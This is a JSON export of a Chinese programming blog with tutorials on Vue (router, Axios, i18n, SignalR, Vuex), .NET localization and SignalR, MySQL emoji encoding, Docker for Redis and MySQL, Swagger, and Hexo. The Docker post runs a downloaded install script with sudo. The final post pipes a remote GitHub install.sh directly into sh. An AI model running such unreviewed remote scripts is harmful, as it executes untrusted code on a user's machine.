&#x27;./App.vue&#x27;;import router from &#x27;./router&#x27;; const app = createApp(App) app.use(router) // 使用路由 app.mount(&#x27;#app&#x27;) 4.路由导航可以使用 来实现路由导航，使用 来渲染当前路由匹配到的组件。 12345678910111213141516&lt;!-- App.vue --&gt;&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;router-link to=&quot;/login&quot; class=&quot;nav-link&quot;&gt;Login&lt;/router-link&gt; &lt;router-link to=&quot;/setting&quot; class=&quot;nav-link&quot;&gt;Setting&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123; name: &#x27;App&#x27;&#125;;&lt;/script&gt; 5.运行实例​​ 点击Setting 则来到&#x2F;setting ， 展示的是Setting的内容 AxiosAxios 是一个流行的基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js 环境。它允许你以简单、直观的方式发送异步HTTP请求，并处理响应。Axios 具有许多功能，包括： 支持 Promise API：Axios使用Promise对象进行异步操作的处理，使得代码更加清晰和易于理解。 支持浏览器和Node.js：Axios可以在浏览器和Node.js环境中使用，这使得它成为跨平台开发的理想选择。 拦截请求和响应：你可以在发送请求或接收响应时，使用拦截器对请求或响应进行全局处理。 自动转换JSON数据：Axios会自动将接收到的JSON数据转换为JavaScript对象，方便在代码中进行处理。 取消请求：Axios允许你取消未完成的HTTP请求，防止不必要的网络请求。 客户端端口支持防止CSRF：Axios可以自动识别和处理CSRF保护。 错误处理：Axios提供了丰富的错误处理机制，方便你处理各种网络请求可能出现的错误。 适用于前端和后端开发，使得发送和处理HTTP请求变得更加简单和高效。 1.安装Axios可以通过npm或者yarn进行安装。 1npm install axios 2.引入axios 1import axios from &#x27;axios&#x27;; 3.axios请求方法 1234567891011121314151617181920212223242526272829&lt;script&gt;import axios from &#x27;axios&#x27;; export default &#123; methods: &#123; AxiosTest() &#123; const url = &#x27;/api/getLogByID&#x27;; const id = &#x27;3&#x27;; // 使用Axios发送GET请求 axios.get(url, &#123; params: &#123; id: id &#125; &#125;) .then(response =&gt; &#123; // 请求成功时的处理逻辑 console.log(response.data); // 输出获取到的日志数据 &#125;) .catch(error =&gt; &#123; // 请求失败时的处理逻辑 console.error(&#x27;There was an error!&#x27;, error); &#125;);&#125;&#125;;&lt;/script&gt; 4.调用方法在Vue模板中调用方法：通过事件绑定或其他方式来调用上面定义的方法。 1&lt;button @click=&quot;AxiosTest&quot;&gt;获取 &lt;/button&gt; 5.运行实例​​ 户点击按钮时，AxiosTest方法被调用，它会使用Axios发送GET请求来调用GetLogByID方法，并处理返回的数据或错误。 console.log 输出 返回的数据 Vue-i18n 国际化在Vue应用中使用Vue I18n时，可以按照以下步骤操作： 1.安装Vue I18n首先，需要安装Vue I18n。可以通过npm或者yarn来安装Vue I18n 1npm install vue-i18n or 1yarn add vue-i18n 2.创建语言文件接下来，创建语言文件。这些文件可以是JSON格式的，用来存储不同语言的翻译信息。例如en.json、zh.json和fr.json等文件，分别存储英语、中文和法语的信息。 123456789101112131415161718192021// en.json&#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &#125;// en.json&#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &#125;// zh.json&#123; &quot;Welcome&quot;: &quot;欢迎&quot;, &quot;Login&quot;: &quot;登录&quot;, &quot;Setting&quot;: &quot;设置&quot;, &#125; 3.在Vue组件中使用Vue I18n 在Vue组件中引入Vue I18n，并创建一个实例。 123456789101112131415161718192021222324252627282930// main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#123; createI18n &#125; from &#x27;vue-i18n&#x27;import router from &#x27;./router&#x27; // 引入语言文件import en from &#x27;./locales/en.json&#x27;import zh from &#x27;./locales/zh.json&#x27;import fr from &#x27;./locales/fr.json&#x27; // 创建 Vue I18n 实例const i18n = createI18n(&#123; locale: &#x27;en&#x27;, // 默认语言 messages: &#123; en, zh, fr &#125;&#125;) // 创建 Vue 应用实例const app = createApp(App) // 使用 Vue I18n 和路由app.use(i18n)app.use(router) // 挂载应用app.mount(&#x27;#app&#x27;) 4.在组件中使用翻译使用 $t 方法来进行翻译。 123456789101112131415&lt;!-- HelloWorld.vue --&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;&#123;&#123; $t(&#x27;Welcome&#x27;) &#125;&#125;&lt;/h1&gt; &lt;p&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; $t(&#x27;Setting&#x27;) &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123; &#125;&lt;/script&gt; 5.切换语言： 最后，通过修改Vue I18n实例的locale属性来切换语言。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 切换到中文i18n.global.locale = &#x27;zh&#x27;; // 切换到法语i18n.global.locale = &#x27;fr&#x27;;在2.创建语言文件时也可以只创建一个json，减少后续维护成本如：// lan.json&#123; &quot;en&quot;: &#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &quot;UserManagement&quot;: &quot;User Management&quot; &#125;, &quot;zh&quot;: &#123; &quot;Welcome&quot;: &quot;欢迎&quot;, &quot;Login&quot;: &quot;登录&quot;, &quot;Setting&quot;: &quot;设置&quot;, &quot;UserManagement&quot;: &quot;用户管理&quot; &#125;, &quot;fr&quot;: &#123; &quot;Welcome&quot;: &quot;Bienvenue&quot;, &quot;Login&quot;: &quot;Connexion&quot;, &quot;Setting&quot;: &quot;Réglage&quot;, &quot;UserManagement&quot;: &quot;Gestion des utilisateurs&quot; &#125;, &quot;ru&quot;: &#123; &quot;Welcome&quot;: &quot;Добро пожаловать&quot;, &quot;Login&quot;: &quot;Войти&quot;, &quot;Setting&quot;: &quot;Настройки&quot;, &quot;UserManagement&quot;: &quot;Управление пользователями&quot; &#125;, &quot;hk&quot;: &#123; &quot;Welcome&quot;: &quot;歡迎&quot;, &quot;Login&quot;: &quot;登錄&quot;, &quot;Setting&quot;: &quot;設置&quot;, &quot;UserManagement&quot;: &quot;用戶管理&quot;, &#125; &#125;//main.jsimport translations from &#x27;./lan.json&#x27; // 创建 Vue I18n 实例const i18n = createI18n(&#123; locale: &#x27;en&#x27;, // 默认语言 messages: translations&#125;) 5.运行实例​​ ​​ Vue-SignalR 实时通讯在Vue应用中使用SignalR，可以按照以下步骤进行 1.安装SignalR客户端库 首先，需要安装SignalR的JavaScript客户端库。可以通过npm或者yarn来安装。 1npm install @microsoft/signalr or 1yarn add @microsoft/signalr 2.在Vue组件中使用SignalR在Vue组件中引入SignalR库，并创建一个SignalR连接，然后订阅服务器发送的消息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;script&gt;import &#123; HubConnectionBuilder &#125; from &#x27;@microsoft/signalr&#x27;; export default &#123; data() &#123; return &#123; messageText: &#x27;&#x27;, hubConnection: null, messages: [] &#125;; &#125;, methods: &#123; sendMessage() &#123; if (!this.messageText) return; // 发送消息给SignalR Hub this.hubConnection.invoke(&#x27;SendMessage2&#x27;,&#x27;user1&#x27;, this.messageText) .then(() =&gt; &#123; console.log(&#x27;Message sent: &#x27;, this.messageText); // 清空输入框 this.messageText = &#x27;&#x27;; &#125;) .catch(error =&gt; &#123; console.error(&#x27;Error sending message: &#x27;, error); &#125;); &#125; &#125;, created() &#123; this.hubConnection = new HubConnectionBuilder() .withUrl(&quot;/chatHub&quot;) // SignalR Hub的URL .build(); this.hubConnection.start() .then(() =&gt; console.log(&quot;SignalR connection established.&quot;)) .catch(err =&gt; console.error(&quot;SignalR connection failed: &quot;, err)); this.hubConnection.on(&quot;ReceiveMessage&quot;, (user, message) =&gt; &#123; this.messages.push(&#123; user, message &#125;); &#125;); &#125;&#125;&lt;/script&gt; &#x2F;chatHub 是服务端通讯地址 SignalR服务端 👉 .NET SignalR Redis 3.在模板中显示消息 最后，在你的Vue模板中显示从SignalR收到的消息。 12345678910&lt;template&gt; &lt;div&gt; &lt;input type=&quot;text&quot; v-model=&quot;messageText&quot;&gt; &lt;button @click=&quot;sendMessage&quot;&gt;Send&lt;/button&gt; &lt;br&gt; &lt;div v-for=&quot;(message, index) in messages&quot; :key=&quot;index&quot;&gt; &lt;p&gt;&#123;&#123; message.user &#125;&#125;: &#123;&#123; message.message &#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; 这里创建了一个messageTex 获取用户输入的文本点击按钮Send时，会调用sendMessage 方法来发送消息给SignalR Hub。并将输入框中的消息作为参数传递给它。 4.运行实例可以看到消息实时传递到另一个客户端​​ VuexVuex 是 Vue.js 的状态管理库，用于集中管理应用的状态 用于全局状态管理 数据共享 1.安装Vuex1npm install vuex ​​ 2.导入依赖 1import &#123; createStore &#125; from &#x27;vuex&#x27;; 这里做个简单的登录Vuex store例子 123456789101112131415161718192021222324252627282930313233343536import &#123; createStore &#125; from &#x27;vuex&#x27;;import api from &#x27;../services/api&#x27;; export default createStore(&#123; state: &#123; isLoggedIn: false, user: null &#125;, mutations: &#123; login(state, user) &#123; state.isLoggedIn = true; state.user = user; &#125;, logout(state) &#123; state.isLoggedIn = false; state.user = null; &#125; &#125;, actions: &#123; async login(&#123; commit &#125;, loginForm) &#123; try &#123; const response = await api.post(&#x27;/api/userApi/GetUserByMobilePwd&#x27;, loginForm); // 登录成功，更新用户信息并设置登录状态 commit(&#x27;login&#x27;, response.data.rsData); //rsData return response.data; &#125; catch (error) &#123; // 登录失败，抛出错误 throw new Error(error.response.data.message || &#x27;Login failed&#x27;); &#125; &#125;, logout(&#123; commit &#125;) &#123; // 清除用户信息并设置登录状态为未登录 commit(&#x27;logout&#x27;); &#125; &#125;&#125;); state 对象包含应用的全局状态，其中 isLoggedIn 是否已经登录，user 存储用户信息。 mutations login 方法用于将用户登录状态设置为已登录，并存储用户信息， logout 方法用于将用户登录状态设置为未登录，并清空用户信息。 actions login 方法用于发起登录请求，并根据响应结果提交 login mutation 来更新用户登录状态和用户信息， logout 方法用于处理用户登出逻辑。 getters 包含一些计算属性，用于从 state 中派生出一些衍生状态。 这里的 isLoggedIn getter 返回 state.isLoggedIn，以确保状态的响应性。 3.在Vue组件中使用 12345//main.jsimport store from &#x27;./services/store.js&#x27;; ... app.provide(&#x27;store&#x27;, store) // 注入 Vuex store 4.编写组件login logout 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class=&quot;login-container&quot;&gt; &lt;div class=&quot;login-card&quot;&gt; &lt;h2 class=&quot;login-title&quot; style=&quot;margin-top: ;&quot;&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/h2&gt; &lt;form @submit.prevent=&quot;login&quot; class=&quot;login-form&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;mobile&quot;&gt;&#123;&#123; $t(&#x27;username&#x27;) &#125;&#125;&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;mobile&quot; v-model=&quot;loginForm.mobile&quot; &gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;pwd&quot;&gt;&#123;&#123; $t(&#x27;password&#x27;) &#125;&#125;&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;pwd&quot; v-model=&quot;loginForm.pwd&quot; &gt; &lt;/div&gt; &lt;button v-if=&quot;!isLoggedIn&quot; type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/button&gt; &lt;/form&gt; &lt;div v-if=&quot;isLoggedIn&quot; class=&quot;user-info&quot;&gt; &lt;p&gt;Welcome, &#123;&#123; user &amp;&amp; user.UserName &#125;&#125;!&lt;/p&gt; &lt;button @click=&quot;logout&quot; class=&quot;btn btn-danger&quot;&gt;&#123;&#123; $t(&#x27;Logout&#x27;) &#125;&#125;&lt;/button&gt; &lt;/div&gt; &lt;!-- 添加按钮用于测试 &lt;button @click=&quot;checkIsLoggedIn&quot; class=&quot;btn btn-primary&quot;&gt;Check isLoggedIn&lt;/button&gt; --&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; 5.编写脚本Vue3 setup() 函数设置组件逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445export default &#123; setup() &#123; const store = useStore(); const loginForm = ref(&#123; mobile: &#x27;&#x27;, pwd: &#x27;&#x27; &#125;); const isLoggedIn = computed(() =&gt; store.state.isLoggedIn); // 使用 computed 获取响应式的 isLoggedIn const user = computed(() =&gt; store.state.user); // 使用 computed 获取响应式的 user const login = async () =&gt; &#123; try &#123; console.log(&#x27;isLoggedIn before login:&#x27;, isLoggedIn.value); // 在调用接口前输出 isLoggedIn const result = await store.dispatch(&#x27;login&#x27;, loginForm.value); if (result) &#123; console.log(&#x27;Login successful&#x27;); console.log(&#x27;isLoggedIn after login:&#x27;, isLoggedIn.value); // 在调用接口后输出 isLoggedIn &#125; else &#123; console.error(&#x27;Login failed: Login unsuccessful&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;Login failed:&#x27;, error.message); &#125; &#125;; const logout = async () =&gt; &#123; try &#123; await store.dispatch(&#x27;logout&#x27;); console.log(&#x27;Logout successful&#x27;); &#125; catch (error) &#123; console.error(&#x27;Logout failed:&#x27;, error.message); &#125; &#125;; // 新增方法用于测试 const checkIsLoggedIn = () =&gt; &#123; console.log(&#x27;isLoggedIn:&#x27;, isLoggedIn.value); &#125;; return &#123; loginForm, login, logout, isLoggedIn, user, checkIsLoggedIn &#125;; &#125;&#125;;&lt;/script&gt; 当 isLoggedIn 在 mutations 中被修改时，组件中使用该属性的地方会立即更新。 6.运行实例​​ 当然，还有很多组件值得学习。 愿在前端的旅程，不断进步！🐶","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"}],"author":"mu"},{"title":".NET i18n ","slug":"NET-i18n","date":"2024-04-15T17:29:17.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/16/NET-i18n/","permalink":"https://banjinmei.github.io/2024/04/16/NET-i18n/","excerpt":"","text":"环境 WIN10 VS2022 .NET8 👋创建项目​ 👀创建Resources ControllersHomeController.en.resx ​HomeController.fr.resx ​HomeController.zh.resx ​ 🌱Program.cs添加国际化支持12345678910111213141516171819202122// 添加国际化支持builder.Services.AddLocalization(options =&gt;&#123; options.ResourcesPath = &quot;Resources&quot;;&#125;); var app = builder.Build(); // 多语言var supportedCultures = new List&lt;CultureInfo&gt; &#123; new CultureInfo(&quot;en&quot;), new CultureInfo(&quot;zh&quot;), new CultureInfo(&quot;fr&quot;), &#125;; app.UseRequestLocalization(new RequestLocalizationOptions&#123; DefaultRequestCulture = new RequestCulture(&quot;zh&quot;), SupportedCultures = supportedCultures, SupportedUICultures = supportedCultures&#125;); ⚡注入localizer123456789 private readonly IStringLocalizer&lt;HomeController&gt; localizer; public HomeController(ILogger&lt;HomeController&gt; logger, IStringLocalizer&lt;HomeController&gt; localizer)&#123; _logger = logger; this.localizer = localizer;&#125; 📫编写调用方法 [HttpGet] public ActionResult&lt;string&gt; Get() &#123; string rsstr= localizer.GetString(&quot;String1&quot;).Value;//?ui-culture=zh return rsstr; &#125; 默认是中文 ?ui-culture&#x3D;en 则取对应HomeController.en.resx 里面的String1 ​ ​ 🐟","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"i18n","slug":"i18n","permalink":"https://banjinmei.github.io/tags/i18n/"}],"author":"mu"},{"title":"MySQL Incorrect string value ","slug":"MySQL-Incorrect","date":"2024-04-13T01:27:51.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/13/MySQL-Incorrect/","permalink":"https://banjinmei.github.io/2024/04/13/MySQL-Incorrect/","excerpt":"","text":"MySQL存储IOS传过来emoji错误处理 Incorrect string value: ‘‘ for column ‘xxx‘ at rowMySQL Incorrect string value: ‘\\xF0\\x9F\\x8D\\xBA‘ for column ‘xxx‘ at row ​ 调用接口提示 Incorrect string value: ‘\\xF0\\x9F\\x8D\\xBA’ for column ‘xxx’ at row 😵‍💫 需要把mysql字段排序规则 utf8mb4_0900_ai_ci 改成 utf8mb4_unicode_ci ​ 💤SQL调整ALTER TABLE MUser CHANGE Signature Signature VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL; 设置该列的字符集为utf8mb4。utf8mb4是MySQL中的一个字符集，它可以存储四字节的UTF-8字符，因此可以支持更多的Unicode字符，如某些表情符号。 设置该列的校对规则为utf8mb4_unicode_ci。校对规则决定了字符如何比较和排序。utf8mb4_unicode_ci是一个不区分大小写的校对规则，它基于Unicode标准。 ALTER DATABASE IDB CHARACTER SET &#x3D; utf8mb4 COLLATE &#x3D; utf8mb4_unicode_ci; 设置该数据库的字符集为utf8mb4。 设置该数据库的校对规则为utf8mb4_unicode_ci。 ​ 💤服务端连接调整 ChatSet utf8mb4 ​ 💤Runing​ ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"}],"author":"mu"},{"title":"Debian Docker Redis ","slug":"debian-docker-reids","date":"2024-04-12T01:27:49.000Z","updated":"2024-11-13T16:34:44.090Z","comments":true,"path":"2024/04/12/debian-docker-reids/","permalink":"https://banjinmei.github.io/2024/04/12/debian-docker-reids/","excerpt":"","text":"Debian安装docker 1.使用官方脚本自动安装docker安装命令如下： 12curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh 如果安装提示 -bash sudo command not found 则需要 123#updatesudo apt-get updatesudo apt-get install sudo 再执行安装脚本1 安装成功后可以输入 docker命令查看docker版本 12#versiondocker --version 能查到表明安装成功 2.pull redis123#pull redisdocker pull redis:latestpull redis镜像 3.创建reids容器1docker run -itd --name redis-test -p 6379:6379 redis 4.测试redis12345docker exec -it redis-test /bin/bash redis-cliset test 1 get test set test 1 提示ok 1get test 一些命令 1234567891011#imagesdocker images#redisdocker pull redis:latestdocker run -itd --name redis-test -p 6379:6379 redis#test redisdocker exec -it redis-test /bin/bash - redis-cliset test 1 get test 持久化 1docker run --name some-redis -p 6379:6379 -v /path/to/redis/data:/data -d redis 这里的 &#x2F;path&#x2F;to&#x2F;redis&#x2F;data 是你本地的一个路径，&#x2F;data 是容器内 Redis 数据存储的默认位置。 -v 参数来挂载一个本地目录作为数据卷","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"Reids","slug":"Reids","permalink":"https://banjinmei.github.io/tags/Reids/"}],"author":"mu"},{"title":".NET SignalR Redis ","slug":"NET-SignalR-Redis","date":"2024-04-11T23:44:04.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/12/NET-SignalR-Redis/","permalink":"https://banjinmei.github.io/2024/04/12/NET-SignalR-Redis/","excerpt":"","text":"环境 Win10 VS2022 .NET8 Docker Redis 前言 什么是 SignalR？ASP.NET Core SignalR 是一个开放源代码库，可用于简化向应用添加实时 Web 功能。 实时 Web 功能使服务器端代码能够将内容推送到客户端。 适合 SignalR 的候选项： 需要从服务器进行高频率更新的应用。 （游戏、社交网络、投票、拍卖、地图和 GPS 应用）仪表板和监视应用。 （公司仪表板、即时销售更新或出行警报）协作应用。 （包括白板应用和团队会议软件）需要通知的应用。（ 社交网络、电子邮件、聊天、游戏等）SignalR 提供用于创建服务器到客户端的远程过程调用 (RPC) API。 RPC 从服务器端 .NET Core 代码调用客户端上的函数。支持JavaScript ，.NET ，JAVA，Swift （官方没有明确支持，这是第三方库）其中每个平台都有各自的客户端 SDK。 因此，RPC 调用所调用的编程语言有所不同。 ASP.NET Core SignalR 的一些功能： 自动处理连接管理。同时向所有连接的客户端发送消息。 例如聊天室。向特定客户端或客户端组发送消息。对其进行缩放，以处理不断增加的流量。SignalR 中心协议1.👋nuget引入SignalR​​​ 2.👀创建SignalR Hub 12345678910111213141516using Microsoft.AspNetCore.SignalR;using System.Threading.Tasks; namespace WebSignalR&#123; public class ChatHub : Hub &#123; public async Task SendMessage(string user, string message) &#123; await Clients.All.SendAsync(&quot;ReceiveMessage&quot;, user, message); &#125; &#125; &#125; 3.🌱 Program.cs添加SignalR服务 (Startup.cs) 12345678910//添加SignalR服务 builder.Services.AddSignalR();builder.Services.AddControllersWithViews();app.UseEndpoints(endpoints =&gt;&#123; endpoints.MapHub&lt;ChatHub&gt;(&quot;/chathub&quot;); endpoints.MapControllerRoute( name: &quot;default&quot;, pattern: &quot;&#123;controller=Home&#125;/&#123;action=Index&#125;/&#123;id?&#125;&quot;);&#125;); 4.📫 添加前端代码 123456789101112131415161718192021222324252627282930313233343536373839&lt;div class=&quot;text-center&quot;&gt; &lt;div id=&quot;chat-container&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;userInput&quot; placeholder=&quot;Your name&quot; /&gt; &lt;input type=&quot;text&quot; id=&quot;messageInput&quot; placeholder=&quot;Type a message...&quot; /&gt; &lt;button id=&quot;sendButton&quot;&gt;Send&lt;/button&gt; &lt;ul id=&quot;messagesList&quot;&gt;&lt;/ul&gt; &lt;/div&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/microsoft-signalr/5.0.12/signalr.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; const connection = new signalR.HubConnectionBuilder() .withUrl(&quot;/chathub&quot;) .build(); connection.on(&quot;ReceiveMessage&quot;, function (user, message) &#123; const encodedUser = user.replace(/&amp;/g, &quot;&amp;amp;&quot;).replace(/&lt;/g, &quot;&amp;lt;&quot;).replace(/&gt;/g, &quot;&amp;gt;&quot;); const encodedMessage = message.replace(/&amp;/g, &quot;&amp;amp;&quot;).replace(/&lt;/g, &quot;&amp;lt;&quot;).replace(/&gt;/g, &quot;&amp;gt;&quot;); const li = document.createElement(&quot;li&quot;); li.textContent = `$&#123;encodedUser&#125;: $&#123;encodedMessage&#125;`; document.getElementById(&quot;messagesList&quot;).appendChild(li); &#125;); connection.start().catch(function (err) &#123; return console.error(err.toString()); &#125;); document.getElementById(&quot;sendButton&quot;).addEventListener(&quot;click&quot;, function (event) &#123; const user = document.getElementById(&quot;userInput&quot;).value; const message = document.getElementById(&quot;messageInput&quot;).value; connection.invoke(&quot;SendMessage&quot;, user, message).catch(function (err) &#123; return console.error(err.toString()); &#125;); event.preventDefault(); &#125;); &lt;/script&gt; &lt;/div&gt; 5.⚡F5运行​​​ 升级优化 封装Msg 1234567891011public class Msg&#123; public string? user &#123; get; set; &#125; public string? message &#123; get; set; &#125;&#125;//sendMessage public async Task SendMessage(Msg entity) &#123; if (Clients != null) await Clients.All.SendAsync(&quot;ReceiveMessage&quot;, entity.user, entity.message);// $&quot;&#123;entity.user&#125; 发送消息：&#123;entity.message&#125;&quot;); &#125; 前端 connection.invoke(“SendMessage” … 传递msg对象进来即可 6.💪跨域问题 1234567891011builder.Services.AddCors(options =&gt;&#123; options.AddPolicy(&quot;CorsPolicy&quot;, builder =&gt; builder .AllowAnyMethod() .AllowAnyHeader() .WithOrigins(&quot;http://localhost:5173&quot;) // 替换为你允许的来源 .AllowCredentials());&#125;);//通过添加app.UseCors(&quot;CorsPolicy&quot;)中间件来启用跨域支持app.UseCors(&quot;CorsPolicy&quot;); 上面代码中的WithOrigins方法指定了允许访问SignalR端点的来源。将​”","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"},{"name":"SignalR","slug":"SignalR","permalink":"https://banjinmei.github.io/tags/SignalR/"}],"author":"mu"},{"title":".NET Swagger ","slug":"NET-Swagger","date":"2024-04-11T15:27:19.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/11/NET-Swagger/","permalink":"https://banjinmei.github.io/2024/04/11/NET-Swagger/","excerpt":"","text":"开发环境 Win10 VS2022 .NET8.0 1.从NuGet添加Swagger​ 在解决方案资源管理器中右键单击项目&gt;管理 NuGet 包将包源设置为“nuget.org”确保启用“包括预发行”选项在搜索框中输入“Swashbuckle.AspNetCore”从“浏览”选项卡中选择最新的“Swashbuckle.AspNetCore”包，然后单击“安装” 2.将 Swagger 生成器添加到以下位置的服务集合中Program.cs：1234builder.Services.AddControllers(); builder.Services.AddEndpointsApiExplorer();builder.Services.AddSwaggerGen(); ​ 启用中间件 生成 12345678app.UseSwagger();app.UseSwaggerUI(); app.UseSwaggerUI(options =&gt;&#123; options.SwaggerEndpoint(&quot;/swagger/v1/swagger.json&quot;, &quot;v1&quot;); options.RoutePrefix = string.Empty;&#125;); ​ 3.添加API控制器创建api 1234567891011121314151617181920212223242526272829303132333435// GET api/&lt;myapi&gt;/5/// &lt;summary&gt;/// getid/// &lt;/summary&gt;/// &lt;param name=&quot;id&quot;&gt;id参数&lt;/param&gt;/// &lt;returns&gt;valuestr&lt;/returns&gt;[HttpGet(&quot;&#123;id&#125;&quot;)]public string Get(int id)&#123; return &quot;value&quot; + id;&#125; // POST api/&lt;myapi&gt;[HttpPost]public string Post([FromBody] string value)&#123; //post逻辑代码 return &quot;myPost&quot;;&#125; // PUT api/&lt;myapi&gt;/5[HttpPut(&quot;&#123;id&#125;&quot;)]public string Put(int id, [FromBody] string value)&#123; //put逻辑代码 return &quot;myPut&quot;;&#125; // DELETE api/&lt;myapi&gt;/5[HttpDelete(&quot;&#123;id&#125;&quot;)]public string Delete(int id)&#123; //delete逻辑代码 return &quot;myDelete&quot;;&#125; ​ 4.F5运行 访问&#x2F;swagger&#x2F;index.html​ 5.try it out测试API​ 看到返回了 value111 即接口没问题","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Swagger","slug":"Swagger","permalink":"https://banjinmei.github.io/tags/Swagger/"}],"author":"mu"},{"title":"Docker MySQL ","slug":"Docker-MySQL","date":"2024-04-11T00:35:22.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/11/Docker-MySQL/","permalink":"https://banjinmei.github.io/2024/04/11/Docker-MySQL/","excerpt":"","text":"1.下载docker desktophttps://www.docker.com/products/docker-desktop/ 创建容器1docker run 创建并启动mysql容器 –name 容器名字 -d 后台运行容器 -p 映射端口 -e 参数 截至目前最新的mysql是mysql8.0.36 那就整这个试下。 1docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=你的密码 mysql:8.0.36-debian ​ 等待一会，看到mysql已经pull下来。 回到docker看到容器已经创建。 ​ ​ 可以输入docker images查看 ​ 3.创建mysql数据库管理软件容器 1docker run --name myadmin -d --link mysql-container:db -p 8880:80 phpmyadmin/phpmyadmin ​ 回到docker查看下容器是否创建成功。​ 复制地址到浏览器访问。​ ​ okok 唉哟不错哦~ 扩展：ubuntu版本 1docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=xxxxxx ubuntu/mysql:8.0-22.04_beta https://hub.docker.com/r/ubuntu/mysql?uuid=D64B1F2A-A81A-4D2C-B66B-FCFAECE77EFE","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"}],"author":"mu"},{"title":"Hello World Hexo","slug":"hello-world","date":"2024-03-20T14:16:01.000Z","updated":"2024-08-29T14:30:28.000Z","comments":true,"path":"2024/03/20/hello-world/","permalink":"https://banjinmei.github.io/2024/03/20/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post123456789npm install hexo-cli -ghexo init blogcd blognpm installhexo server$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"}],"author":"mu"},{"title":"some code","slug":"Cloud","date":"2023-08-02T18:12:50.000Z","updated":"2024-12-28T15:48:20.059Z","comments":true,"path":"2023/08/03/Cloud/","permalink":"https://banjinmei.github.io/2023/08/03/Cloud/","excerpt":"","text":"other skillsserver test1curl https://raw.githubusercontent.com/zhanghanyun/backtrace/main/install.sh -sSf | sh 